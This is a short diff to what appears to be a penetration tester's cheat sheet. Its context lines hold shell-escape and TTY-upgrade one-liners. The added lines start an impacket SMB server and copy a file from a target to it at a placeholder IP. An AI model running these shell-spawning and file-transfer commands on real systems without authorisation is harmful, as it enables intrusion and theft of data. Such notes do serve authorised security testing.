@@ -30,3 +30,7 @@ lua: os.execute('/bin/sh')
 
 **TTY Shell**
 python -c 'import pty; pty.spawn("/bin/sh")'
+
+**SMB Server**
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support Labaratory /home/sako/Labaratory
+cp file.txt \\<IP>\Labaratory
